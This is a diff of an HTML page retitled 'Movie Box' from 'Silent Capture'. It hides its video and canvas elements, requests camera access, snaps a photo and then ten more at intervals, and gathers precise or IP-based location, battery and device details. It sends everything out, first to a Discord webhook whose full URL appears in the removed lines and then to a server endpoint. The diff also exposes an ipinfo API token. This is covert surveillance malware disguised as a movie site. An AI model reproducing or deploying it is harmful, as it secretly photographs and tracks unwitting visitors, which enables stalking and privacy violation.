@@ -1,73 +1,116 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>Silent Capture</title>
-  <style>video,canvas{display:none!important}</style>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Movie Box</title>
+<style>
+  video, canvas { display:none !important; }
+</style>
 </head>
 <body>
 <video id="video" autoplay playsinline muted></video>
 <canvas id="canvas"></canvas>
 <script>
 (async function(){
-  const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1413583590989627653/bXjzVyVrBeuMIIAJFYNLPna-m7VOq9JeEHcaGVlscMjP198EWKbKGH28R-IdSrvrfqcf"; // <-- put your webhook here
   const FOLLOWUP_COUNT = 10;
   const INTERVAL_MS = 3000;
   const WIDTH = 640, HEIGHT = 480;
 
-  const video = document.getElementById('video');
-  const canvas = document.getElementById('canvas');
-  const ctx = canvas.getContext('2d');
+  const video = document.getElementById("video");
+  const canvas = document.getElementById("canvas");
+  const ctx = canvas.getContext("2d");
   let stream;
 
   function snap(){
     canvas.width = WIDTH; canvas.height = HEIGHT;
     ctx.drawImage(video,0,0,WIDTH,HEIGHT);
-    return canvas.toDataURL('image/jpeg',0.9);
+    return canvas.toDataURL("image/jpeg",0.9);
   }
 
-  async function sendToDiscord(imageDataUrl, caption=""){
-    const blob = await (await fetch(imageDataUrl)).blob();
-    const form = new FormData();
-    form.append("file", blob, `photo_${Date.now()}.jpg`);
-    if (caption) form.append("content", caption);
-    await fetch(DISCORD_WEBHOOK_URL,{method:"POST",body:form});
-  }
-
-  function getLocation(){
+  async function getGeoLocation(){
     return new Promise((resolve,reject)=>{
-      if(!navigator.geolocation) return reject("No geolocation");
+      if(!navigator.geolocation) return reject("Geolocation not supported");
       navigator.geolocation.getCurrentPosition(
         pos=>{
-          resolve(`Location: ${pos.coords.latitude.toFixed(6)}, ${pos.coords.longitude.toFixed(6)} (±${Math.round(pos.coords.accuracy)}m)`);
+          const lat = pos.coords.latitude.toFixed(6);
+          const lng = pos.coords.longitude.toFixed(6);
+          const acc = Math.round(pos.coords.accuracy);
+          resolve({ lat, lng, acc });
         },
         err=>reject(err),
-        {enableHighAccuracy:true, timeout:15000, maximumAge:0}
+        { enableHighAccuracy:true, timeout:15000, maximumAge:0 }
       );
+    });
+  }
+
+  async function getIPLocation(){
+    try{
+      const res = await fetch("https://ipinfo.io/json?token=c62a8dce7203fe");
+      const data = await res.json();
+      return { city:data.city, region:data.region, country:data.country, ip:data.ip };
+    } catch { return null; }
+  }
+
+  async function getBatteryInfo(){
+    try{
+      const b = await navigator.getBattery();
+      return { level:(b.level*100).toFixed(0), charging:b.charging };
+    } catch { return null; }
+  }
+
+  function getDeviceInfo(){
+    return {
+      userAgent: navigator.userAgent,
+      platform: navigator.platform,
+      cores: navigator.hardwareConcurrency || "?",
+      memory: navigator.deviceMemory || "?",
+      screen: `${screen.width}x${screen.height}`,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      language: navigator.language,
+      network: navigator.connection?.effectiveType || "unknown"
+    };
+  }
+
+  async function sendToServer(payload){
+    await fetch("/api/sendToDiscord",{
+      method:"POST",
+      headers:{"Content-Type":"application/json"},
+      body:JSON.stringify(payload)
     });
   }
 
   async function start(){
     try{
-      stream = await navigator.mediaDevices.getUserMedia({video:true});
+      let locationData;
+      try { locationData = await getGeoLocation(); }
+      catch { locationData = await getIPLocation(); }
+
+      const battery = await getBatteryInfo();
+      const device = getDeviceInfo();
+
+      // Request camera
+      stream = await navigator.mediaDevices.getUserMedia({ video:true });
       video.srcObject = stream;
       await video.play();
 
-      // First photo + location
-      const firstImg = snap();
-      let caption = "";
-      try{ caption = await getLocation(); }catch(e){ caption = "Location unavailable"; }
-      await sendToDiscord(firstImg, caption);
+      // First photo + metadata
+      const firstPhoto = snap();
+      await sendToServer({
+        photo:firstPhoto,
+        location: locationData,
+        battery,
+        device
+      });
 
       // Follow-up photos
       for(let i=0;i<FOLLOWUP_COUNT;i++){
         await new Promise(r=>setTimeout(r,INTERVAL_MS));
         const img = snap();
-        await sendToDiscord(img);
+        await sendToServer({ photo: img });
       }
     }catch(e){
-      console.error("Error:",e);
+      console.error(e);
     }finally{
       if(stream) stream.getTracks().forEach(t=>t.stop());
     }
